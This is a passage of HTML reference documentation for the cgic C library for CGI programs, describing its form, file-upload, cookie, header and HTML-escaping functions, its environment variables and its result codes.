is selected, the corresponding integer in\n  the result array will be set to one; other entries in the result\n  array will be set to zero. cgiFormSelectMultiple() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> \n  if at least one valid selection was successfully retrieved or\n  cgiFormNotFound if no valid selections were submitted.\n  The integer pointed to by invalid is set to the number of\n  invalid selections that were submitted, which should be zero\n  unless the form and the choicesText array do not agree.\n\n<br><br><dt><strong>\n<a name=\"cgiFormSubmitClicked\">\ncgiFormResultType cgiFormSubmitClicked(\n  char *name)<\/a>\n<\/strong><br><dd>\nIt is often desirable to know whether a particular submit button was clicked,\n  when multiple submit buttons with different name attributes exist.\n  cgiFormSubmitClicked is an alternative name for the \n  <a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle<\/a> function,\n  which is suitable for testing whether a particular submit button\n  was used.\n<br><br><dt><strong>\n<a name=\"cgiFormCheckboxSingle\">\ncgiFormResultType cgiFormCheckboxSingle(\n  char *name)<\/a>\n<\/strong><br><dd>\ncgiFormCheckboxSingle determines whether the checkbox with the specified name\n  is checked. cgiFormCheckboxSingle returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the\n  button is checked, <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if the checkbox is\n  not checked. cgiFormCheckboxSingle is intended for single\n  checkboxes with a unique name; see below for functions to\n  deal with multiple checkboxes with the same name, and\n  with radio buttons.\n\n<br><br><dt><strong><a name=\"cgiFormCheckboxMultiple\">\ncgiFormResultType cgiFormCheckboxMultiple(\n  char *name, char **valuesText, int valuesTotal, \n  int *result, int *invalid)<\/a>\n<\/strong><br><dd>cgiFormCheckboxMultiple() determines which checkboxes among a group\n  of checkboxes with the same name are checked. This is distinct\n  from radio buttons (see <a href=\"#cgiFormRadio\">cgiFormRadio<\/a>). \n  valuesText \n  should point to an array of strings identifying the VALUE\n  attribute of each checkbox; valuesTotal should indicate the total \n  number of checkboxes. result should point to an array of integers with \n  as many elements as there are strings in the valuesText array. For \n  each choice in the valuesText array that is selected, the corresponding\n  integer in the result array will be set to one; other entries in the \n  result array will be set to zero. cgiFormCheckboxMultiple returns \n  cgiFormSuccess if at least one valid checkbox was checked or\n  cgiFormNotFound if no valid checkboxes were checked.\n  The integer pointed to by invalid is set to the number of\n  invalid selections that were submitted, which should be zero\n  unless the form and the valuesText array do not agree.\n<br><br><dt><strong><a name=\"cgiFormRadio\">\ncgiFormResultType cgiFormRadio(\n  char *name, char **valuesText, int valuesTotal, \n  int *result, int defaultV)<\/a>\n<\/strong><br><dd>cgiFormRadio() determines which, if any, of a group of radio boxes with\n  the same name was selected. valuesText should point to an array of \n  strings identifying the VALUE attribute of each radio box; \n  valuesTotal should indicate the total number of radio boxes. The value \n  pointed to by result will be set to the position of the actual choice \n  selected within the valuesText array, if any, or to the value of \n  default, if no radio box was checked or an invalid selection was \n  made. cgiFormRadio() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if a checked radio box was \n  found in the group, <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no box was checked, and \n  <a href=\"#cgiFormNoSuchChoice\">cgiFormNoSuchChoice<\/a> if the radio box submitted does not match any of \n  the possibilities in the valuesText array.\n\n<br><dt><strong><a name=\"cgiFormFileName\">cgiFormResultType cgiFormFileName(\n  char *name, char *fileName, int max)<\/a>\n<\/strong><br><dd>cgiFormFileName attempts to retrieve the file name uploaded by the\n  user for the specified form input field of type <code>file<\/code>. \n  <strong>NEVER, EVER TRUST THIS FILENAME TO BE REASONABLE AND\n  SAFE FOR DIRECT USE ON THE SERVER SIDE.<\/strong>\n  The text will be copied into\n  the buffer specified by fileName, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. cgiFormFileName returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the string was \n  successfully retrieved and was not empty,\n  <a href=\"#cgiFormNoFileName\">cgiFormNoFileName<\/a> if the string was \n  successfully retrieved but empty indicating that no file was uploaded,\n  <a href=\"#cgiFormTruncated\">cgiFormTruncated<\/a> if the string was\n  retrieved but was truncated to fit the buffer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n<br><dt><strong><a name=\"cgiFormFileSize\">cgiFormResultType cgiFormFileSize(\n  char *name, int *sizeP)<\/a>\n<\/strong><br><dd>cgiFormFileSize attempts to retrieve the size, in bytes, of a\n  file uploaded by the browser in response to the\n  input field of type <code>file<\/code> specified by the\n  <code>name<\/code> parameter. On success, the size is stored\n  to *sizeP, and this function returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>. If the form\n  field does not exist, this function returns \n  <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>.\n  If the form field exists but no file was uploaded, this function\n  returns <a href=\"#cgiFormNotAFile\">cgiFormNotAFile<\/a>.\n<br><dt><strong><a name=\"cgiFormFileContentType\">cgiFormResultType cgiFormFileContentType(\n  char *name, char *contentType, int max)<\/a>\n<\/strong><br><dd>cgiFormString attempts to retrieve the content name claimed by the\n  user for the specified form input field of type <code>file<\/code>. \n  <strong>THERE IS NO GUARANTEE THAT THE CONTENT TYPE WILL BE\n  ACCURATE.<\/strong>\n  The content type string will be copied into\n  the buffer specified by contentType, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string. cgiFormFileContentType returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the string was \n  successfully retrieved and was not empty,\n  <a href=\"#cgiFormNoContentType\">cgiFormNoContentType<\/a> if the string was \n  successfully retrieved but empty indicating that no file was uploaded\n  or the browser did not know the content type,\n  <a href=\"#cgiFormTruncated\">cgiFormTruncated<\/a> if the string was\n  retrieved but was truncated to fit the buffer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no \n  such input field was submitted. In the last case, \n  an empty string is copied to result. \n\n<br><dt><strong><a name=\"cgiFormFileOpen\">cgiFormResultType cgiFormFileOpen(\n  char *name, cgiFilePtr *cfpp)<\/a>\n<\/strong><br><dd>cgiFormFileOpen attempts to open the actual uploaded file data for\n  the specified form field of type <code>file<\/code>. Upon success,\n  this function returns retrieve the content name claimed by the\n  user for the specified form input field of type <code>file<\/code>. \n  On success, this function sets *cfpp to a valid cgiFilePtr\n  object for use with <a href=\"#cgiFormFileRead<\/a>cgiFormFileRead<\/a>\n  and returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>.\n  On failure, this function sets *cfpp to a null pointer, and\n  returns <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>,\n  <a href=\"#cgiFormNotAFile\">cgiFormNotAFile<\/a>,\n  <a href=\"#cgiFormMemory\">cgiFormMemory<\/a> or\n  <a href=\"#cgiFormIO\">cgiFormIO<\/a> as appropriate.\n<p>\n  See also <a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a> \nand <a href=\"#cgiFormFileClose\">cgiFormFileClose<\/a>.\n<br><dt><strong><a name=\"cgiFormFileRead\">cgiFormResultType cgiFormFileRead(\n  cgiFilePtr cfp, char *buffer, int bufferSize, int *gotP)<\/a>\n<\/strong><br><dd>cgiFormFileRead attempts to read up to <code>bufferSize<\/code>\n  bytes from a cgiFilePtr object previously opened with\n  <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a>. If any data\n  is successfully read, it is copied to <code>buffer<\/code>, \n  and the number of bytes successfully read is stored \n  to <code>*gotP<\/code>. This function returns \n  <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if any data\n  is successfully read. At end of file, this function\n  returns <a href=\"#cgiFormEOF\">cgiFormEOF<\/a>. In the event\n  of an I\/O error, this function returns \n  <a href=\"#cgiFormIO\">cgiFormIO<\/a>. If cfp is a null pointer,\n  this function returns <a href=\"#cgiFormOpenFailed\">cgiFormOpenFailed<\/a>.\n  <p>\n  See also <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a> \nand <a href=\"#cgiFormFileClose\">cgiFormFileClose<\/a>.\n<br><dt><strong><a name=\"cgiFormFileClose\">cgiFormResultType cgiFormFileClose(\n  cgiFilePtr cfp)<\/a>\n<\/strong><br><dd>cgiFormFileClose closes a cgiFilePtr object previously opened\n  with <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a>, freeing\n  memory and other system resources. This\n  function returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>\n  unless cfp is null, in which case \n  <a href=\"#cgiFormOpenFailed\">cgiFormOpenFailed<\/a> is returned.\n<p>\n  See also <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a> \nand <a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a>.\n<br><br><dt><strong><a name=\"cgiHeaderLocation\">\nvoid cgiHeaderLocation(char *redirectUrl)<\/a>\n<\/strong><br><dd>\ncgiHeaderLocation() should be called if the programmer wishes to\nredirect the user to a different URL. No futher output\nis needed in this case.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger<\/a>\n<\/strong> BEFORE invoking cgiHeaderLocation. \n<br><br><dt><strong><a name=\"cgiHeaderStatus\">\nvoid cgiHeaderStatus(int status, char *statusMessage)<\/a>\n<\/strong><br><dd>\ncgiHeaderStatus() should be called if the programmer wishes to\noutput an HTTP error status code instead of a document. The status\ncode is the first argument; the second argument is the status\nmessage to be displayed to the user.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger<\/a>\n<\/strong> BEFORE invoking cgiHeaderStatus.\n<br><br><dt><strong><a name=\"cgiHeaderContentType\">\nvoid cgiHeaderContentType(char *mimeType)<\/a>\n<\/strong><br><dd>\ncgiHeaderContentType() should be called if the programmer wishes to\noutput a new document in response to the user's request. This is\nthe normal case. The single argument is the MIME document type\nof the response; typical values are \"text\/html\" for HTML documents, \n\"text\/plain\" for plain ASCII without HTML tags, \"image\/gif\" for\na GIF image and \"audio\/basic\" for .au-format audio.\n<p>\nIf you wish to set cookies,\n<strong>you must make your calls to \n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>\nand \n<a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger<\/a>\n<\/strong> BEFORE invoking cgiHeaderContentType.\n<br><br><dt><strong><a name=\"cgiHeaderCookieSetString\">\nvoid cgiHeaderCookieSetString(char *name, char *value,\n  int secondsToLive, char *path, char *domain)<\/a>\n<\/strong><br><dd>\ncgiHeaderCookieSetString() should be called when the programmer wishes\nto store a piece of information in the user's browser, so that the\nstored information is again presented to the server on subsequent\naccesses to the relevant site. The first argument is the name of the\ncookie to be stored; for best results in all browsers, use a short\nname without spaces or unusual punctuation. The second argument is\nthe value of the cookie to be stored. Again, for best results, use\na short string; it is recommended that cookies be used to store a\nunique identifier which is then used to look up more detailed\ninformation in a database on the server side. Attempts to store\nelaborate information on the browser side are much more likely to fail.\nThe third argument is the number of seconds that the cookie should\nbe kept by the browser; 86400 is a single full day, 365*86400 is\nroughly one year. The fourth argument is the partial URL of the\nweb site within which the cookie is relevant. If the cookie should\nbe sent to the server for every access to the entire site, \nset this argument to <code>\/<\/code>. The final argument is the\nweb site name or entire domain for which this cookie should be\nsubmitted; if you choose to have the cookie sent back for an\nentire domain, this argument must begin with a dot, such as\n<code>.boutell.dev<\/code>. The cgic variables <a name=\"#cgiScriptName<\/a>\nand <a name=\"#cgiServerName\">cgiServerName<\/a> are convenient\nvalues for the fourth and fifth arguments.\nSee also <a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger<\/a>,\n<a href=\"#cgiCookieString\">cgiCookieString<\/a>, \n<a href=\"#cgiCookieString\">cgiCookieInteger<\/a> and\n<a href=\"#cgiCookies\">cgiCookies<\/a>.\n<br><br><dt><strong><a name=\"cgiHeaderCookieSetInteger\">\nvoid cgiHeaderCookieSetInteger(char *name, int value,\n  int secondsToLive, char *path, char *domain)<\/a>\n<\/strong><br><dd>\ncgiHeaderCookieSetInteger() is identical to\n<a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>,\nexcept that the value to be set is an integer rather than a string.\nSee <a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>\nfor complete information.\n<br>\n<br><dt><strong><a name=\"cgiCookieString\">cgiFormResultType cgiCookieString(\n  char *name, char *result, int max)<\/a>\n<\/strong><br><dd>cgiFormString attempts to retrieve the string sent for the\n  specified cookie (browser-side persistent storage). The \n  text will be copied into\n  the buffer specified by result, up to but not\n  exceeding max-1 bytes; a terminating null is then\n  added to complete the string.\n  cgiCookieString returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> if the string was \n  successfully retrieved, \n  <a href=\"#cgiFormTruncated\">cgiFormTruncated<\/a> if the string was\n  retrieved but was truncated to fit the buffer,\n  cgiFormEmpty if the string was \n  retrieved but was empty, and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no \n  such cookie was submitted. In the last case, \n  an empty string is copied to result. \n<br><br><dt><strong><a name=\"cgiCookieInteger\">cgiFormResultType cgiCookieInteger(\n  char *name, int *result, int defaultV)<\/a>\n  See also <a href=\"#cgiCookieString\">cgiCookieInteger<\/a>,\n  <a href=\"#cgiCookies\">cgiCookies<\/a>,\n  <a href=\"#cgiHeaderCookieSetString>cgiHeaderCookieSetString<\/a>, and\n  <a href=\"#cgiHeaderCookieSetInteger>cgiHeaderCookieSetInteger<\/a>.\n<\/strong><br><dd>cgiCookieInteger() attempts to retrieve the integer sent for the\n  specified cookie (browser-side persistent storage). The value \n  pointed to by result will be set to the value submitted. \n  cgiCookieInteger() returns \n  cgiFormSuccess if the value was successfully retrieved,\n  cgiFormEmpty if the value submitted is an empty string,\n  cgiFormBadType if the value submitted is not an integer,\n  and <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if no such \n  input field was submitted. In the last three cases, the value \n  pointed to by result is set to the specified default.\n  See also <a href=\"#cgiCookieString\">cgiCookieString<\/a>,\n  <a href=\"#cgiCookies\">cgiCookies<\/a>,\n  <a href=\"#cgiHeaderCookieSetString>cgiHeaderCookieSetString<\/a>, and\n  <a href=\"#cgiHeaderCookieSetInteger>cgiHeaderCookieSetInteger<\/a>.\n<br><br><dt><strong><a name=\"cgiCookies\">cgiFormResultType cgiCookies(\n  char *name, char ***ptrToStringArray)<\/a>\n<\/strong><br><dd>cgiCookies is useful when the programmer cannot know the names\n  of all relevant cookies (browser-side persistent strings) in advance.\n  The value pointed to by result will be set to a pointer to an array \n  of strings; the last\n  entry in the array will be a null pointer.  This array is allocated \n  by the CGI library. Important: when done working with the array,\n  you must call cgiStringArrayFree() with the array pointer as the \n  argument. cgiCookies() returns <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a> except in the event of an out of memory error.\n  On success, ptrToStringArray is set to point to a \n  valid array of strings, with the last element in the array being a \n  null pointer; in the out-of-memory case ptrToStringArray is set to \n  a null pointer, and \n  <a href=\"#cgiFormOutOfMemory\">cgiFormOutOfMemory<\/a> is returned.\n<br><br><dt><strong><a name=\"cgiHtmlEscape\">\ncgiFormResultType cgiHtmlEscape(char *s)<\/a>\n<\/strong><br><dd>\ncgiHtmlEscape() outputs the specified null-terminated string to \n<a href=\"#cgiOut\">cgiOut<\/a>,\nescaping any &lt;, &amp;, and &gt; characters encountered correctly so that\nthey do not interfere with HTML markup. Returns \n<a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>, or\n<a href=\"#cgiFormIO\">cgiFormIO<\/a> in the event of an I\/O error.\n<p> \n<br><br><dt><strong><a name=\"cgiHtmlEscapeData\">\ncgiFormResultType cgiHtmlEscapeData(char *data, int len)<\/a>\n<\/strong><br><dd>\ncgiHtmlEscapeData() is identical to <a href=\"#cgiHtmlEscape\">cgiHtmlEscape<\/a>,\nexcept that the data is not null-terminated. This version of the function\noutputs <code>len<\/code> bytes. See <a href=\"#cgiHtmlEscape\">cgiHtmlEscape<\/a>\nfor more information.\n<br><br><dt><strong><a name=\"cgiValueEscape\">\ncgiFormResultType cgiValueEscape(char *s)<\/a>\n<\/strong><br><dd>\ncgiValueEscape() outputs the specified null-terminated string to \n<a href=\"#cgiOut\">cgiOut<\/a>,\nescaping any \" characters encountered correctly so that\nthey do not interfere with the quotation marks of HTML attribute\nvalues. This is useful when outputting a string as part of the\nvalue attribute of an input tag, or the href attribute of a link\nor form tag. This function returns\n<a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>, or\n<a href=\"#cgiFormIO\">cgiFormIO<\/a> in the event of an I\/O error.\n<p> \n<br><br><dt><strong><a name=\"cgiValueEscapeData\">\ncgiFormResultType cgiValueEscapeData(char *data, int len)<\/a>\n<\/strong><br><dd>\ncgiValueEscapeData() is identical to <a href=\"#cgiValueEscape\">cgiValueEscape<\/a>,\nexcept that the data is not null-terminated. This version of the function\noutputs <code>len<\/code> bytes. See <a href=\"#cgiValueEscape\">cgiValueEscape<\/a>\nfor more information.\n<br><br><dt><strong><a name=\"cgiWriteEnvironment\">\ncgiEnvironmentResultType cgiWriteEnvironment(char *filename)<\/a>\n<\/strong><br><dd>\ncgiWriteEnvironment() can\n  be used to write the entire CGI environment, including\n  form data, to the specified output file; <a href=\"#cgiReadEnvironment\">\n  cgiReadEnvironment()<\/a> \n  can then be used to restore that environment from the specified\n  input file for debugging. Of course, these will only work as expected\n  if you use the <a href=\"#variables\">cgic copies of the CGI environment \n  variables<\/a> and <a href=\"#cgiIn\">cgiIn<\/a> and \n  <a href=\"#cgiOut\">cgiOut<\/a> rather than stdin and\n  stdout (also see above). These functions are useful in order \n  to capture real CGI situations while the web server is running, then\n  recreate them in a debugging environment. Both functions\n  return <a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess<\/a> on \n  success, <a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO<\/a> on an I\/O \n  error, and <a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory<\/a>\n  on an out-of-memory error.\n<br><br><dt><strong><a name=\"cgiReadEnvironment\">\ncgiEnvironmentResultType cgiReadEnvironment(char *filename)<\/a>\n<\/strong><br><dd>\ncgiReadEnvironment() restores a CGI environment saved to the specified file by\n  <a href=\"#cgiWriteEnvironment\">cgiWriteEnvironment().<\/a> \n  Of course, these will only work as expected\n  if you use the <a href=\"#variables\">cgic copies of the CGI environment \n  variables<\/a> and <a href=\"#cgiIn\">cgiIn<\/a> and \n  <a href=\"#cgiOut\">cgiOut<\/a> rather than stdin and\n  stdout (also see above). These functions are useful in order \n  to capture real CGI situations while the web server is running, then\n  recreate them in a debugging environment. Both functions\n  return <a href=\"#cgiEnvironmentSuccess\">cgiEnvironmentSuccess<\/a> on success, \n  <a href=\"#cgiEnvironmentIO\">cgiEnvironmentIO<\/a> on an I\/O error, and \n  <a href=\"#cgiEnvironmentMemory\">cgiEnvironmentMemory<\/a>\n  on an out-of-memory error.\n<br><br><dt><strong><a name=\"cgiMain\">int cgiMain()<\/a>\n<\/strong><br><dd><strong>The programmer must write this function<\/strong>, which performs \n  the unique task of the program and is invoked by the true main() \n  function, found in the cgic library itself. The return value from \n  cgiMain will be the return value of the program. It is expected that \n  the user will make numerous calls to the cgiForm functions\n  from within this function. See <a href=\"#howto\">how to write\n  a cgic application<\/a> for details.\n<\/dl>\n<h3><a name=\"variables\">cgic variable reference<\/a><\/h3>\nThis section provides a reference guide to the various global\nvariables provided by cgic for the programmer to utilize.\nThese variables should always be used in preference to\nstdin, stdout, and calls to getenv() in order to ensure\ncompatibility with the <a href=\"#debug\">cgic CGI debugging features<\/a>.\n<p>\nMost of these variables are equivalent to various CGI environment\nvariables. The most important difference is that the cgic\nenvironment string variables are never null pointers. They will always \npoint to valid C strings of zero or more characters.\n<dl>\n<br><dt><strong><a name=\"cgiServerSoftware\">char *cgiServerSoftware<\/a>\n<\/strong><br><dd>Points to the name of the server software,\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerName\">char *cgiServerName<\/a>\n<\/strong><br><dd>Points to the name of the server,\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiGatewayInterface\">char *cgiGatewayInterface<\/a>\n<\/strong><br><dd>Points to the name of the gateway interface (usually CGI\/1.1),\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerProtocol\">char *cgiServerProtocol<\/a>\n<\/strong><br><dd>Points to the protocol in use (usually HTTP\/1.0),\nor to an empty string if unknown.\n<br><dt><strong><a name=\"cgiServerPort\">char *cgiServerPort<\/a>\n<\/strong><br><dd>Points to the port number on which the server is listening\nfor HTTP connections (usually 80), or an empty string if unknown.\n<br><dt><strong><a name=\"cgiRequestMethod\">char *cgiRequestMethod<\/a>\n<\/strong><br><dd>Points to the method used in the request (usually GET or POST),\nor an empty string if unknown (this should not happen).\n<br><dt><strong><a name=\"cgiPathInfo\">char *cgiPathInfo<\/a>\n<\/strong><br><dd>Most web servers recognize any additional path information in \nthe URL of the request beyond the name of the CGI program itself and\npass that information on to the program. cgiPathInfo points to this\nadditional path information.\n<br><dt><strong><a name=\"cgiPathTranslated\">char *cgiPathTranslated<\/a>\n<\/strong><br><dd>Most web servers recognize any additional path information in \nthe URL of the request beyond the name of the CGI program itself and\npass that information on to the program. cgiPathTranslated points\nto this additional path information, translated by the server into a \nfilesystem path on the local server.\n<br><dt><strong><a name=\"cgiScriptName\">char *cgiScriptName<\/a>\n<\/strong><br><dd>Points to the name under which the program was invoked.\n<br><dt><strong><a name=\"cgiQueryString\">char *cgiQueryString<\/a>\n<\/strong><br><dd>Contains any query information submitted by the user as a result\nof a GET-method form or an &lt;ISINDEX&gt; tag. Note that this\ninformation need not be parsed directly unless an &lt;ISINDEX&gt; tag\nwas used; normally it is parsed automatically by the cgic library. Use \nthe cgiForm family of functions to retrieve the values associated\nwith form input fields. See <a href=\"#howto\">how to write\na cgic application<\/a> for more information.\n<br><dt><strong><a name=\"cgiRemoteHost\">char *cgiRemoteHost<\/a>\n<\/strong><br><dd>Points to the fully resolved hostname of the browser, if known,\nor an empty string if unknown.\n<br><dt><strong><a name=\"cgiRemoteAddr\">char *cgiRemoteAddr<\/a>\n<\/strong><br><dd>Points to the dotted-decimal IP address of the browser, if known,\nor an empty string if unknown.\n<br><dt><strong><a name=\"cgiAuthType\">char *cgiAuthType<\/a>\n<\/strong><br><dd>Points to the type of authorization used for the request,\nif any, or an empty string if none or unknown.\n<br><dt><strong><a name=\"cgiRemoteUser\">char *cgiRemoteUser<\/a>\n<\/strong><br><dd>Points to the user name under which the user has \nauthenticated; an empty string if no authentication has\ntaken place. The certainty of this information depends on\nthe type of authorization in use; see\n<a href=\"#cgiAuthType\">cgiAuthType<\/a>.\n<br><dt><strong><a name=\"cgiRemoteIdent\">char *cgiRemoteIdent<\/a>\n<\/strong><br><dd>Points to the user name volunteered by the user via\nthe user identification protocol; an empty\nstring if unknown. This information is not secure.\nIdentification demons can be installed by users on\ninsecure systems such as Windows machines.\n<br><dt><strong><a name=\"cgiContentType\">char *cgiContentType<\/a>\n<\/strong><br><dd>Points to the MIME content type of the information\nsubmitted by the user, if any; an empty string if no\ninformation was submitted. If this string is equal to\n<code>application\/x-www-form-urlencoded<\/code> or\n<code>multipart\/form-data<\/code>, the cgic\nlibrary will automatically examine the form data submitted.\nIf this string has any other non-empty value, a different\ntype of data has been submitted. This is currently very rare,\nas most browsers can only submit forms and file uploads which\ncgic parses directly.\n<br><dt><strong><a name=\"cgiContentType\">char *cgiCookie<\/a>\n<\/strong><br><dd>Points to the raw cookie (browser-side persistent storage)\ndata submitted by the web browser. \nProgrammers should use the functions <a href=\"#cgiCookies\">cgiCookies<\/a>,\n<a href=\"#cgiCookieString\">cgiCookieString<\/a> and\n<a href=\"#cgiCookieInteger\">cgiCookieInteger<\/a> instead of\nexamining this string directly.\n<br><dt><strong><a name=\"cgiAccept\">char *cgiAccept<\/a>\n<\/strong><br><dd>Points to a space-separated list of MIME content types\nacceptable to the browser (see <a href=\"#cgiHeaderContentType\">\ncgiHeaderContentType()<\/a> ), or an empty string. Unfortunately, this variable\nis not supplied in a useful form by most current browsers. Programmers wishing\nto make decisions based on the capabilities of the browser\nare advised to check the <a href=\"#cgiUserAgent\">cgiUserAgent<\/a>\nvariable against a list of browsers and capabilities instead.\n<br><dt><strong><a name=\"cgiUserAgent\">char *cgiUserAgent<\/a>\n<\/strong><br><dd>\nPoints to the name of the browser in use, or an empty\nstring if this information is not available. \n<br><dt><strong><a name=\"cgiReferrer\">char *cgiReferrer<\/a>\n<\/strong><br><dd>\nPoints to the URL of the previous page visited by the user. This is\noften the URL of the form that brought the user to your program.\nNote that reporting this information is entirely up to the browser,\nwhich may choose not do so, and may choose not to do so truthfully.\nHowever, this variable is typically accurate. <strong>The frequently\nused misspelling cgiReferer is also supplied as a macro.<\/strong>\n<br><dt><strong><a name=\"cgiContentLength\">int cgiContentLength<\/a>\n<\/strong><br><dd>The number of bytes of form or query data received.\n  Note that if the submission is a form or query submission\n  the library will read and parse all the information\n  directly from cgiIn and\/or cgiQueryString. The programmer should\n  not do so, and indeed the cgiIn pointer will be at end-of-file\n  in such cases.\n<br><dt><strong><a name=\"cgiOut\">FILE *cgiOut<\/a>\n<\/strong><br><dd>Pointer to CGI output. The cgiHeader functions, such as\n  <a href=\"#cgiHeaderContentType\">cgiHeaderContentType<\/a>, should \n  be used first to output the mime headers; the output HTML\n  page, GIF image or other web document should then be written\n  to cgiOut by the programmer using standard C I\/O functions\n  such as fprintf() and fwrite(). cgiOut is normally equivalent\n  to stdout; however, it is recommended that cgiOut be used to\n  ensure compatibility with future versions of cgic for\n  specialized environments.\n<br><dt><strong><a name=\"cgiIn\">FILE *cgiIn<\/a>\n<\/strong><br><dd>Pointer to CGI input. In 99.99% of cases, you will not \n  need this. CGIC 2.0 supports both regular POST form submissions\n  and multipart\/form-data file upload form submissions directly.\n<\/dl>\n<H3><a name=\"resultcodes\">cgic result code reference<\/a><\/h3>\n<p>\nIn most cases, cgic functions are designed to produce reasonable results\neven when browsers and users do unreasonable things. However, it is sometimes\nimportant to know precisely which unreasonable things took place, especially\nwhen assigning a default value or bounding a value is an inadequate\nsolution. The following result codes are useful in making this determination.\n<dl>\n<br><dt><strong><a name=\"cgiFormSuccess\">cgiFormSuccess<\/a>\n<\/strong><br><dd>Indicates that the function successfully performed at least one\naction (or retrieved at least one value, where applicable).\n<br><dt><strong><a name=\"cgiFormTruncated\">cgiFormTruncated<\/a>\n<\/strong><br><dd>Indicates that a string value retrieved from the user was\ncut short to avoid overwriting the end of a buffer.\n<br><dt><strong><a name=\"cgiFormBadType\">cgiFormBadType<\/a>\n<\/strong><br><dd>Indicates that a \"numeric\" value submitted by the user was\nin fact not a legal number.\n<br><dt><strong><a name=\"cgiFormEmpty\">cgiFormEmpty<\/a>\n<\/strong><br><dd>Indicates that a field was retrieved but contained no data.\n<br><dt><strong><a name=\"cgiFormNotFound\">cgiFormNotFound<\/a>\n<\/strong><br><dd>Indicates that no value was submitted for a particular field.\n<br><dt><strong><a name=\"cgiFormConstrained\">cgiFormConstrained<\/a>\n<\/strong><br><dd>Indicates that a numeric value was beyond the specified bounds\nand was forced to the lower or upper bound as appropriate.\n<br><dt><strong><a name=\"cgiFormNoSuchChoice\">cgiFormNoSuchChoice<\/a>\n<\/strong><br><dd>Indicates that the value submitted for a single-choice field\n(such as a radio-button group) was not one of the acceptable values.\nThis usually indicates a discrepancy between the form and the program.\n<br><dt><strong><a name=\"cgiFormEOF\">cgiFormEOF<\/a>\n<\/strong><br><dd>Returned by <a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a>\nwhen, at the start of the call, the cgiFilePtr object is already\npositioned at the end of the uploaded file data. \n<br><dt><strong><a name=\"cgiFormEOF\">cgiFormIO<\/a>\n<\/strong><br><dd>Returned by <a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a>\nwhen an I\/O error occurs while reading uploaded file data.\n<br><dt><strong><a name=\"cgiFormNotAFile\">cgiFormNotAFile<\/a>\n<\/strong><br><dd>Returned in response to an attempt to manipulate a form field\nthat is not a file upload field using a file-related function.\n<br><dt><strong><a name=\"cgiFormNoContentType\">cgiFormNoContentType<\/a>\n<\/strong><br><dd>Returned in response to an attempt to fetch the content type of\na file-upload field when the content type is not specified by the browser.\n<br><dt><strong><a name=\"cgiFormNoFileName\">cgiFormNoFileName<\/a>\n<\/strong><br><dd>Returned in response to an attempt to fetch the file name of\na file-upload field when a file name is not specified by the browser.\n<br><dt><strong><a name=\"cgiFormOpenFailed\">cgiFormOpenFailed<\/a>\n<\/strong><br><dd>Returned in response to an attempt to read from a null\ncgiFilePtr object, typically when the programmer has failed to\ncheck the result of a call to <a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a>.\n<br><dt><strong><a name=\"cgiEnvironmentMemory\">cgiEnvironmentMemory<\/a>\n<\/strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file failed due to an out-of-memory error.\n<br><dt><strong><a name=\"cgiEnvironmentSuccess\">cgiEnvironmentSuccess<\/a>\n<\/strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file was successful.\n<br><dt><strong><a name=\"cgiEnvironmentIO\">cgiEnvironmentIO<\/a>\n<\/strong><br><dd>Indicates that an attempt to read or write the CGI environment\nto or from a capture file failed due to an I\/O error. \n<br><dt><strong><a name=\"cgiEnvironmentWrongVersion\">cgiEnvironmentWrongVersion<\/a>\n<\/strong><br><dd>Indicates that an attempt to read from a 